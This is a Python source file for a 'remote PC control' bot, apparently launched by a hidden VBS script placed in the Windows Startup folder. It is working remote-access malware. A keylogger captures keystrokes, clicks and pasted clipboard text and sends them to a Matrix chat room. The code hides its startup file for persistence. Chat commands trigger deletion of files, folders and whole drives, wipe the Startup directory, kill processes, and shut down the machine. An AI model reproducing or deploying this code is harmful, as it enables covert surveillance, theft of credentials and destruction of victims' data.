#!/usr/bin/env python3
"""
b_s.py - Matrix bot for remote PC control
This file is downloaded and run by bot_starter.vbs
"""

import asyncio
import os
import sys
import time
import threading
import subprocess
import psutil
from datetime import datetime, timezone
import tempfile
from pathlib import Path
import pyautogui
import pyperclip
from pynput import keyboard, mouse
import queue
from collections import deque


# Matrix configuration (will be replaced by bot_starter.vbs)
BOT_NAME = "PLACEHOLDER_BOT_NAME"
USERNAME = "PLACEHOLDER_USERNAME"
PASSWORD = "PLACEHOLDER_PASSWORD"
ROOM_ID = "PLACEHOLDER_ROOM_ID"
HOMESERVER = "PLACEHOLDER_HOMESERVER"

class KeyLogger:
    def __init__(self, bot_instance):
        self.bot = bot_instance
        self.mode = None  # 'word' or 'key'
        self.is_active = False
        self.recorded_data = deque()
        self.current_word = ""
        self.key_buffer = []
        self.last_activity_time = time.time()
        self.keyboard_listener = None
        self.mouse_listener = None
        self.modifier_keys = set()
        self.auto_send_task = None
        self.send_queue = queue.Queue()  # Thread-safe queue for sending data
        self.loop = None  # Will store the main event loop
        
        # Special key mappings
        self.special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.tab: '\t',
            keyboard.Key.enter: '\n',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.delete: '[DELETE]',
            keyboard.Key.up: '[UP]',
            keyboard.Key.down: '[DOWN]',
            keyboard.Key.left: '[LEFT]',
            keyboard.Key.right: '[RIGHT]',
            keyboard.Key.home: '[HOME]',
            keyboard.Key.end: '[END]',
            keyboard.Key.page_up: '[PAGE_UP]',
            keyboard.Key.page_down: '[PAGE_DOWN]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.f1: '[F1]', keyboard.Key.f2: '[F2]', keyboard.Key.f3: '[F3]',
            keyboard.Key.f4: '[F4]', keyboard.Key.f5: '[F5]', keyboard.Key.f6: '[F6]',
            keyboard.Key.f7: '[F7]', keyboard.Key.f8: '[F8]', keyboard.Key.f9: '[F9]',
            keyboard.Key.f10: '[F10]', keyboard.Key.f11: '[F11]', keyboard.Key.f12: '[F12]'
        }

    def start_listening(self, mode):
        """Start keylogging in specified mode"""
        if self.is_active:
            return False, "Keylogger is already active"
        
        # Store the current event loop
        try:
            self.loop = asyncio.get_running_loop()
        except RuntimeError:
            return False, "No running event loop found"
        
        self.mode = mode
        self.is_active = True
        self.recorded_data.clear()
        self.current_word = ""
        self.key_buffer = []
        self.modifier_keys.clear()
        self.last_activity_time = time.time()
        
        try:
            # Start keyboard listener
            self.keyboard_listener = keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release,
                suppress=False  # Don't suppress keys
            )
            self.keyboard_listener.start()
            
            # Start mouse listener  
            self.mouse_listener = mouse.Listener(
                on_click=self.on_mouse_click,
                suppress=False  # Don't suppress mouse events
            )
            self.mouse_listener.start()
            
            # Start auto-send timer and queue processor
            self.start_auto_send_timer()
            self.start_queue_processor()
            
            return True, f"Started keylogging in {mode} mode"
            
        except Exception as e:
            self.is_active = False
            return False, f"Failed to start keylogger: {str(e)}"

    def stop_listening(self):
        """Stop keylogging"""
        self.is_active = False
        
        if self.keyboard_listener:
            self.keyboard_listener.stop()
            self.keyboard_listener = None
            
        if self.mouse_listener:
            self.mouse_listener.stop()
            self.mouse_listener = None
            
        if self.auto_send_task:
            self.auto_send_task.cancel()
            self.auto_send_task = None

    def on_key_press(self, key):
        """Handle key press events"""
        if not self.is_active:
            return
            
        self.last_activity_time = time.time()
        
        try:
            # Track modifier keys
            if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                self.modifier_keys.add('ctrl')
            elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
                self.modifier_keys.add('alt')
            elif key in [keyboard.Key.shift_l, keyboard.Key.shift_r]:
                self.modifier_keys.add('shift')
            elif key == keyboard.Key.cmd:
                self.modifier_keys.add('cmd')
            
            # Handle special key combinations
            if 'ctrl' in self.modifier_keys:
                if hasattr(key, 'char') and key.char:
                    combo = f"Ctrl+{key.char.upper()}"
                    if key.char.lower() == 'v':
                        # Handle paste operation
                        try:
                            clipboard_content = pyperclip.paste()
                            if clipboard_content:
                                self.process_text_input(f"[PASTE: {clipboard_content[:100]}{'...' if len(clipboard_content) > 100 else ''}]")
                        except Exception:
                            self.process_text_input("[PASTE]")
                    elif key.char.lower() == 'c':
                        self.process_text_input("[COPY]")
                    elif key.char.lower() == 'x':
                        self.process_text_input("[CUT]")
                    elif key.char.lower() == 'z':
                        self.process_text_input("[UNDO]")
                    elif key.char.lower() == 'y':
                        self.process_text_input("[REDO]")
                    else:
                        self.process_text_input(f"[{combo}]")
                return
            
            # Handle Enter key - trigger send
            if key == keyboard.Key.enter:
                self.process_text_input('\n')
                self.queue_send_data()
                return
            
            # Process regular keys
            if hasattr(key, 'char') and key.char:
                # Regular character
                self.process_text_input(key.char)
            elif key in self.special_keys:
                # Special key
                special_char = self.special_keys[key]
                self.process_text_input(special_char)
            else:
                # Other special keys
                self.process_text_input(f"[{str(key).replace('Key.', '').upper()}]")
                
        except Exception as e:
            print(f"Error in key press handler: {e}")

    def on_key_release(self, key):
        """Handle key release events"""
        if not self.is_active:
            return
            
        # Remove modifier keys when released
        if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            self.modifier_keys.discard('ctrl')
        elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
            self.modifier_keys.discard('alt')
        elif key in [keyboard.Key.shift_l, keyboard.Key.shift_r]:
            self.modifier_keys.discard('shift')
        elif key == keyboard.Key.cmd:
            self.modifier_keys.discard('cmd')

    def on_mouse_click(self, x, y, button, pressed):
        """Handle mouse click events"""
        if not self.is_active or not pressed:
            return
            
        self.last_activity_time = time.time()
        
        if button == mouse.Button.left:
            self.process_text_input("[LMB_CLICK]")
            self.queue_send_data()
        elif button == mouse.Button.right:
            self.process_text_input("[RMB_CLICK]")
            self.queue_send_data()

    def process_text_input(self, text):
        """Process text input based on current mode"""
        if self.mode == 'key':
            self.key_buffer.append(text)
            if len(self.key_buffer) >= 20:
                chunk = ''.join(self.key_buffer)
                self.recorded_data.append(chunk)
                self.key_buffer = []
        elif self.mode == 'word':
            self.process_word_mode(text)

    def process_word_mode(self, text):
        """Intelligent word processing for word mode"""
        if text in [' ', '\t', '\n'] or text.startswith('[') and text.endswith(']'):
            # Word separator or special key
            if self.current_word.strip():
                self.recorded_data.append(self.current_word.strip())
                self.current_word = ""
            
            if text.strip():  # Don't add empty spaces
                if text == '\n':
                    self.recorded_data.append('[ENTER]')
                elif text.startswith('['):
                    self.recorded_data.append(text)
                else:
                    self.recorded_data.append(text)
        elif text == '[BACKSPACE]':
            if self.current_word:
                self.current_word = self.current_word[:-1]
            elif self.recorded_data:
                # Remove last word/element
                last_item = self.recorded_data.pop()
                if isinstance(last_item, str) and not last_item.startswith('['):
                    self.current_word = last_item[:-1] if len(last_item) > 1 else ""
        else:
            # Regular character
            self.current_word += text

    def queue_send_data(self):
        """Queue data to be sent (thread-safe)"""
        try:
            self.send_queue.put("SEND_NOW", block=False)
        except queue.Full:
            pass  # Queue is full, skip this send request

    def start_queue_processor(self):
        """Start the queue processor task"""
        async def process_queue():
            while self.is_active:
                try:
                    # Check if there's a send request in the queue
                    try:
                        self.send_queue.get_nowait()
                        await self.send_recorded_data()
                    except queue.Empty:
                        pass
                    
                    await asyncio.sleep(0.1)  # Small delay to prevent CPU overuse
                except Exception as e:
                    print(f"Error in queue processor: {e}")
                    
        asyncio.create_task(process_queue())

    def start_auto_send_timer(self):
        """Start the auto-send timer"""
        async def auto_send_loop():
            while self.is_active:
                try:
                    await asyncio.sleep(1)  # Check every second
                    if self.is_active and time.time() - self.last_activity_time > 10:
                        await self.send_recorded_data()
                except Exception as e:
                    print(f"Error in auto-send timer: {e}")
                    
        self.auto_send_task = asyncio.create_task(auto_send_loop())

    async def send_recorded_data(self):
        """Send recorded data to Matrix chat"""
        if not self.recorded_data and not self.current_word and not self.key_buffer:
            return
            
        try:
            # Prepare data to send
            data_to_send = []
            
            if self.mode == 'key':
                # Add any remaining key buffer
                if self.key_buffer:
                    data_to_send.extend(self.key_buffer)
                    self.key_buffer = []
                # Add recorded chunks
                data_to_send.extend(list(self.recorded_data))
            elif self.mode == 'word':
                # Add current word if exists
                if self.current_word.strip():
                    data_to_send.append(self.current_word.strip())
                    self.current_word = ""
                # Add recorded words
                data_to_send.extend(list(self.recorded_data))
            
            if data_to_send:
                # Format the message
                if self.mode == 'key':
                    message = f"[{self.mode.upper()}_MODE] {''.join(data_to_send)}"
                else:
                    message = f"[{self.mode.upper()}_MODE] {' '.join(data_to_send)}"
                    
                # Send to Matrix
                await client.room_send(
                    room_id=ROOM_ID,
                    message_type="m.room.message",
                    content={"msgtype": "m.text", "body": message}
                )
                
                # Clear recorded data
                self.recorded_data.clear()
                
        except Exception as e:
            print(f"Error sending recorded data: {e}")



# Try to import matrix-nio
try:
    from nio import AsyncClient, MatrixRoom, RoomMessageText, LoginResponse, SyncResponse
except ImportError:
    print("Error: matrix-nio not installed. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "matrix-nio[e2e]"])
    from nio import AsyncClient, MatrixRoom, RoomMessageText, LoginResponse, SyncResponse

# Global variables
client = None
keylogger = None
connection_timestamp = None  # This will be in Matrix server time (milliseconds)
temp_dir = os.environ.get('TEMP', tempfile.gettempdir())
lock_file = os.path.join(temp_dir, "matrix_bot_temp", "bot.lock")
running = True
# Global variables for conversation state
awaiting_folder_path = {}
awaiting_file_path = {}
awaiting_drive_name = {}


def update_lock_file():
    """Continuously update lock file to indicate bot is running"""
    global running
    
    # Ensure directory exists
    try:
        os.makedirs(os.path.dirname(lock_file), exist_ok=True)
        print(f"Lock file directory created/verified: {os.path.dirname(lock_file)}")
    except Exception as e:
        print(f"Error creating lock file directory: {e}")
    
    while running:
        try:
            with open(lock_file, 'w') as f:
                f.write(str(time.time()))
            print(f"Lock file updated: {lock_file}")
            time.sleep(10)  # Update every 10 seconds
        except Exception as e:
            print(f"Error updating lock file: {e}")
            time.sleep(10)

def terminate_processes():
    """Terminate b_s.py and b_m.py processes"""
    terminated = []
    errors = []
    
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                cmdline = proc.info.get('cmdline', [])
                if cmdline and len(cmdline) > 1:
                    # Check if it's a Python process running b_s.py or b_m.py
                    if ('python' in cmdline[0].lower() and 
                        any('b_s.py' in arg or 'b_m.py' in arg for arg in cmdline)):
                        proc.terminate()
                        terminated.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # Wait for processes to terminate
        time.sleep(2)
        
        # Force kill if still running
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                cmdline = proc.info.get('cmdline', [])
                if cmdline and len(cmdline) > 1:
                    if ('python' in cmdline[0].lower() and 
                        any('b_s.py' in arg or 'b_m.py' in arg for arg in cmdline)):
                        proc.kill()
                        terminated.append(f"{proc.info['name']} (PID: {proc.info['pid']}) - force killed")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
                
    except Exception as e:
        errors.append(str(e))
    
    return terminated, errors

def get_startup_vbs_path():
    """Get path to bot_starter.vbs in startup folder"""
    startup_folder = os.path.expandvars(
        r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    )
    return os.path.join(startup_folder, "bot_starter.vbs")

def hide_vbs_file():
    """Hide the bot_starter.vbs file"""
    try:
        vbs_path = get_startup_vbs_path()
        if os.path.exists(vbs_path):
            # Set hidden attribute
            subprocess.run(['attrib', '+H', vbs_path], check=True)
            return True
    except Exception as e:
        print(f"Error hiding VBS file: {e}")
    return False

def delete_vbs_file():
    """Delete the bot_starter.vbs file"""
    try:
        vbs_path = get_startup_vbs_path()
        if os.path.exists(vbs_path):
            # Remove hidden attribute first if it exists
            try:
                subprocess.run(['attrib', '-H', vbs_path], check=False)
            except:
                pass
            os.remove(vbs_path)
            return True
    except Exception as e:
        print(f"Error deleting VBS file: {e}")
    return False

def shutdown_pc():
    """Shutdown the PC"""
    try:
        subprocess.run(['shutdown', '/s', '/t', '5'], check=True)
        return True
    except Exception as e:
        print(f"Error shutting down PC: {e}")
        return False

def restart_pc():
    """Restart the PC"""
    try:
        subprocess.run(['shutdown', '/r', '/t', '5'], check=True)
        return True
    except Exception as e:
        print(f"Error restarting PC: {e}")
        return False

def terminate_all_processes():
    """Terminate all Python and VBS processes"""
    terminated = []
    errors = []
    
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
            try:
                proc_info = proc.info
                cmdline = proc_info.get('cmdline', [])
                name = proc_info.get('name', '').lower()
                exe = proc_info.get('exe', '').lower()
                
                # Kill Python processes
                if ('python' in name or 
                    (cmdline and any('python' in arg.lower() for arg in cmdline)) or
                    'python' in exe):
                    proc.terminate()
                    terminated.append(f"Python process {name} (PID: {proc_info['pid']})")
                
                # Kill VBS processes (including hidden/silent ones)
                elif ('wscript' in name or 'cscript' in name or
                      (cmdline and any(arg.lower().endswith('.vbs') for arg in cmdline))):
                    proc.terminate()
                    terminated.append(f"VBS process {name} (PID: {proc_info['pid']})")
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        
        # Wait for processes to terminate
        time.sleep(2)
        
        # Force kill if still running
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
            try:
                proc_info = proc.info
                cmdline = proc_info.get('cmdline', [])
                name = proc_info.get('name', '').lower()
                exe = proc_info.get('exe', '').lower()
                
                if (('python' in name or 
                     (cmdline and any('python' in arg.lower() for arg in cmdline)) or
                     'python' in exe) or
                    ('wscript' in name or 'cscript' in name or
                     (cmdline and any(arg.lower().endswith('.vbs') for arg in cmdline)))):
                    proc.kill()
                    terminated.append(f"{name} (PID: {proc_info['pid']}) - force killed")
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
                
    except Exception as e:
        errors.append(str(e))
    
    return terminated, errors

def clear_startup_directory():
    """Clear the entire startup directory"""
    try:
        startup_folder = os.path.expandvars(
            r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        )
        
        if not os.path.exists(startup_folder):
            return False, "Startup folder not found"
        
        deleted_items = []
        for item in os.listdir(startup_folder):
            item_path = os.path.join(startup_folder, item)
            try:
                # Remove hidden attribute if it exists
                try:
                    subprocess.run(['attrib', '-H', '-S', '-R', item_path], check=False)
                except:
                    pass
                
                if os.path.isfile(item_path):
                    os.remove(item_path)
                    deleted_items.append(f"File: {item}")
                elif os.path.isdir(item_path):
                    import shutil
                    shutil.rmtree(item_path)
                    deleted_items.append(f"Folder: {item}")
            except Exception as e:
                return False, f"Failed to delete {item}: {str(e)}"
        
        return True, f"Deleted {len(deleted_items)} items from startup directory"
        
    except Exception as e:
        return False, str(e)

def delete_folder(folder_path):
    """Delete a folder and all its contents"""
    try:
        if not os.path.exists(folder_path):
            return False, "Folder does not exist"
        
        if not os.path.isdir(folder_path):
            return False, "Path is not a folder"
        
        import shutil
        shutil.rmtree(folder_path)
        return True, "Deleted successfully"
        
    except Exception as e:
        return False, str(e)

def delete_file(file_path):
    """Delete a specific file"""
    try:
        if not os.path.exists(file_path):
            return False, "File does not exist"
        
        if not os.path.isfile(file_path):
            return False, "Path is not a file"
        
        # Remove read-only/hidden attributes if they exist
        try:
            subprocess.run(['attrib', '-H', '-S', '-R', file_path], check=False)
        except:
            pass
        
        os.remove(file_path)
        return True, "Deleted successfully"
        
    except Exception as e:
        return False, str(e)

def clear_drive(drive_letter):
    """Clear all contents of a drive"""
    try:
        # Normalize drive letter
        if not drive_letter.endswith(':'):
            drive_letter += ':'
        if not drive_letter.endswith('\\'):
            drive_letter += '\\'
        
        if not os.path.exists(drive_letter):
            return False, "Drive does not exist"
        
        deleted_count = 0
        errors = []
        
        for item in os.listdir(drive_letter):
            item_path = os.path.join(drive_letter, item)
            try:
                # Remove attributes
                try:
                    subprocess.run(['attrib', '-H', '-S', '-R', item_path], check=False)
                except:
                    pass
                
                if os.path.isfile(item_path):
                    os.remove(item_path)
                    deleted_count += 1
                elif os.path.isdir(item_path):
                    import shutil
                    shutil.rmtree(item_path)
                    deleted_count += 1
            except Exception as e:
                errors.append(f"{item}: {str(e)}")
        
        if errors:
            return False, f"Deleted {deleted_count} items, but {len(errors)} failed: {'; '.join(errors[:3])}"
        else:
            return True, f"Deleted successfully - {deleted_count} items removed"
        
    except Exception as e:
        return False, str(e)

async def establish_connection_timestamp():
    """Establish connection timestamp using Matrix server time"""
    global connection_timestamp
    
    try:
        print("Establishing connection timestamp with Matrix server...")
        
        # Do an initial sync to get server time
        response = await client.sync(timeout=5000)
        
        if isinstance(response, SyncResponse):
            # Get the current server timestamp from the sync response
            # We'll use the next_batch token timestamp or current server time
            
            # Send a dummy message to ourselves to get server timestamp
            try:
                # Send a message that we can identify and get its server timestamp
                temp_message = f"__TIMESTAMP_SYNC__{int(time.time())}"
                await client.room_send(
                    room_id=ROOM_ID,
                    message_type="m.room.message",
                    content={
                        "msgtype": "m.text",
                        "body": temp_message
                    }
                )
                
                # Wait a moment and sync to get the message back with server timestamp
                await asyncio.sleep(1)
                sync_response = await client.sync(timeout=5000)
                
                if isinstance(sync_response, SyncResponse):
                    # Look for our timestamp sync message in the room events
                    room_events = sync_response.rooms.join.get(ROOM_ID)
                    if room_events and room_events.timeline and room_events.timeline.events:
                        for event in reversed(room_events.timeline.events):  # Check newest first
                            if (hasattr(event, 'body') and 
                                isinstance(event.body, str) and 
                                event.body.startswith("__TIMESTAMP_SYNC__")):
                                # Found our sync message, use its server timestamp
                                connection_timestamp = event.server_timestamp
                                print(f"Connection timestamp established: {connection_timestamp} (Matrix server time)")
                                return True
                
            except Exception as e:
                print(f"Error with timestamp sync message method: {e}")
            
            # Fallback: use current time converted to milliseconds
            # This is less accurate but better than nothing
            connection_timestamp = int(time.time() * 1000)
            print(f"Connection timestamp established (fallback): {connection_timestamp}")
            return True
            
    except Exception as e:
        print(f"Error establishing connection timestamp: {e}")
    
    # Final fallback
    connection_timestamp = int(time.time() * 1000)
    print(f"Connection timestamp established (final fallback): {connection_timestamp}")
    return False

async def message_callback(room: MatrixRoom, event: RoomMessageText):
    """Handle incoming messages"""
    global connection_timestamp
    
    # Skip if no connection timestamp established
    if connection_timestamp is None:
        print("No connection timestamp - skipping message")
        return
    
    try:
        # Get message timestamp (already in milliseconds from Matrix server)
        message_timestamp = event.server_timestamp
        
        print(f"Message timestamp: {message_timestamp}, Connection timestamp: {connection_timestamp}")
        
        # Skip our own timestamp sync messages
        if hasattr(event, 'body') and event.body.startswith("__TIMESTAMP_SYNC__"):
            print("Skipping timestamp sync message")
            return
        
        # Only respond to messages sent after connection (both timestamps are in milliseconds)
        if message_timestamp <= connection_timestamp:
            print(f"Ignoring old message (sent before connection): {event.body}")
            return
        
        message = event.body.strip()
        print(f"Processing new message: {message}")
        
        # Process commands
        response = await process_command(message)
        
        if response:
            await client.room_send(
                room_id=room.room_id,
                message_type="m.room.message",
                content={
                    "msgtype": "m.text",
                    "body": response
                }
            )
            
    except Exception as e:
        print(f"Error processing message: {e}")

async def process_command(message):
    """Process bot commands"""
    global running, awaiting_folder_path, awaiting_file_path, awaiting_drive_name
    
    message = message.strip()
    
    # Check if we're awaiting a folder path
    if BOT_NAME in awaiting_folder_path:
        success, msg = delete_folder(message)
        del awaiting_folder_path[BOT_NAME]
        return msg
    
    # Check if we're awaiting a file path
    if BOT_NAME in awaiting_file_path:
        success, msg = delete_file(message)
        del awaiting_file_path[BOT_NAME]
        return msg
    
    # Check if we're awaiting a drive name
    if BOT_NAME in awaiting_drive_name:
        success, msg = clear_drive(message)
        del awaiting_drive_name[BOT_NAME]
        return msg
    
    # DEFCON 5 - Terminate all Python processes
    if message == f"DEFCON 5 {BOT_NAME}":
        terminated, errors = terminate_all_processes()
        if not errors:
            running = False
            return f"Success from {BOT_NAME} on DEFCON 5"
        else:
            return f"Error from {BOT_NAME} on DEFCON 5: {'; '.join(errors)}"
    
    # DEFCON 4 - Terminate all Python and VBS processes
    elif message == f"DEFCON 4 {BOT_NAME}":
        terminated, errors = terminate_all_processes()
        if not errors:
            running = False
            return f"Success from {BOT_NAME} on DEFCON 4"
        else:
            return f"Error from {BOT_NAME} on DEFCON 4: {'; '.join(errors)}"
    
    # DEFCON 3 - Terminate processes and clear startup directory
    elif message == f"DEFCON 3 {BOT_NAME}":
        terminated, errors = terminate_all_processes()
        if not errors:
            success, msg = clear_startup_directory()
            if success:
                running = False
                return f"Success from {BOT_NAME} on DEFCON 3"
            else:
                return f"Error from {BOT_NAME} on DEFCON 3: {msg}"
        else:
            return f"Error from {BOT_NAME} on DEFCON 3: {'; '.join(errors)}"
    
    # DEFCON 2 - All bots terminate and clear startup
    elif message == "DEFCON 2":
        terminated, errors = terminate_all_processes()
        if not errors:
            success, msg = clear_startup_directory()
            if success:
                running = False
                return f"Success from {BOT_NAME} on DEFCON 2"
            else:
                return f"Error from {BOT_NAME} on DEFCON 2: {msg}"
        else:
            return f"Error from {BOT_NAME} on DEFCON 2: {'; '.join(errors)}"
    
    # Online check
    elif message == f"Are you online {BOT_NAME}":
        return f"Yes {BOT_NAME} is online"
    
    # PC Shutdown
    elif message == f"PC Shutdown {BOT_NAME}":
        if shutdown_pc():
            return f"shutdown confirmed for {BOT_NAME}"
        else:
            return f"Error from {BOT_NAME}: Failed to initiate shutdown"
    
    # PC Restart
    elif message == f"PC Restart {BOT_NAME}":
        if restart_pc():
            return f"restart confirmed for {BOT_NAME}"
        else:
            return f"Error from {BOT_NAME}: Failed to initiate restart"
    
    # Clear out a folder
    elif message == f"Clear out a folder {BOT_NAME}":
        awaiting_folder_path[BOT_NAME] = True
        return "Which folder"
    
    # Clear out a file
    elif message == f"Clear out a file {BOT_NAME}":
        awaiting_file_path[BOT_NAME] = True
        return "Which file"
    
    # Clear out a drive
    elif message == f"Clear out a drive {BOT_NAME}":
        awaiting_drive_name[BOT_NAME] = True
        return "Which drive"
    
    # Start listening in Word Mode
    elif message == f"Start listening in Word Mode {BOT_NAME}":
        try:
            success, msg = keylogger.start_listening('word')
            if success:
                return "Listening in Word Mode"
            else:
                return f"Error starting Word Mode: {msg}"
        except Exception as e:
            return f"Error starting Word Mode: {str(e)}"
    
    # Start listening in Key Mode
    elif message == f"Start listening in Key Mode {BOT_NAME}":
        try:
            success, msg = keylogger.start_listening('key')
            if success:
                return "Listening in Key Mode"
            else:
                return f"Error starting Key Mode: {msg}"
        except Exception as e:
            return f"Error starting Key Mode: {str(e)}"
    
    # Stop keylogging
    elif message == f"Stop listening {BOT_NAME}":
        try:
            keylogger.stop_listening()
            return f"{BOT_NAME} stopped listening"
        except Exception as e:
            return f"Error stopping keylogger: {str(e)}"

    # Unrecognized command - respond with nothing
    return None

async def main():
    """Main bot function"""
    global client, keylogger, running
    
    print(f"Starting Matrix bot: {BOT_NAME}")
    print(f"Lock file path: {lock_file}")
    
    # Start lock file updater thread FIRST
    lock_thread = threading.Thread(target=update_lock_file, daemon=True)
    lock_thread.start()
    print("Lock file updater thread started")
    
    # Initial lock file creation
    try:
        os.makedirs(os.path.dirname(lock_file), exist_ok=True)
        with open(lock_file, 'w') as f:
            f.write(str(time.time()))
        print(f"Initial lock file created: {lock_file}")
    except Exception as e:
        print(f"Error creating initial lock file: {e}")
    
    # Create Matrix client
    client = AsyncClient(HOMESERVER, USERNAME)
    # Create keylogger instance
    # Create keylogger instance
    keylogger = KeyLogger(None)

    try:
        # Login
        print("Logging in...")
        response = await client.login(PASSWORD)
        
        if not isinstance(response, LoginResponse):
            print(f"Failed to login: {response}")
            return
        
        print(f"Logged in successfully as {USERNAME}")
        
        # Join the room if not already joined
        try:
            await client.join(ROOM_ID)
            print(f"Joined room: {ROOM_ID}")
        except Exception as e:
            print(f"Note: Could not join room (might already be joined): {e}")
        
        # Set up message callback BEFORE establishing timestamp
        client.add_event_callback(message_callback, RoomMessageText)
        
        # Establish connection timestamp using Matrix server time
        await establish_connection_timestamp()
        
        print("Bot is now online and ready!")
        
        # Keep syncing
        while running:
            try:
                await client.sync(timeout=30000)
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Sync error: {e}")
                await asyncio.sleep(5)
                
    except Exception as e:
        print(f"Bot error: {e}")
    finally:
        running = False
        if client:
            await client.close()
        print("Bot stopped")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped by user")
        running = False
    except Exception as e:
        print(f"Fatal error: {e}")
        running = False
